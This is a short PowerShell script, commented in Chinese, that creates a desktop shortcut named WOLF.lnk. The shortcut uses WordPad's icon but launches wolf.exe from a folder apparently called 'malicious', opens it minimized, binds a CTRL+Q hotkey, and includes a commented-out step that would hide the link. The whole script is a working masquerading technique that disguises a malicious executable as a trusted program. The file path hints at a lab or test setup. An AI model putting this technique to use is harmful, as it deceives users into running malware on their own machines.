# 定义桌面快捷方式路径
$shortcutPath = "$([Environment]::GetFolderPath('Desktop'))\WOLF.lnk"

# 创建WScript Shell object
$wshell = New-Object -ComObject Wscript.Shell

# 创建快捷方式对象
$shortcut = $wshell.CreateShortcut($shortcutPath)

# 设置快捷方式图标为wordpad
$shortcut.IconLocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"

# 设置快捷方式的目标路径和参数
$shortcut.TargetPath = "C:\Users\Administrator\Desktop\test\malicious\pre\wolf.exe"
$shortcut.Arguments = ""

# 设置快捷方式的工作目录
$shortcut.WorkingDirectory = "C:\Users\Administrator\Desktop\test\malicious\pre"

# 设置快捷方式的热键，例如CTRL+Q
$shortcut.HotKey = "CTRL+Q"

# 设置快捷方式的描述
$shortcut.Description = "Hi,i am Snow Wolf"

# 设置快捷方式的窗口样式 (7 = 最小化窗口)
$shortcut.WindowStyle = 7

# 保存快捷方式
$shortcut.Save()

# 添加Hidden属性可使链接不可见
# (Get-Item $shortcutPath).Attributes += 'Hidden'
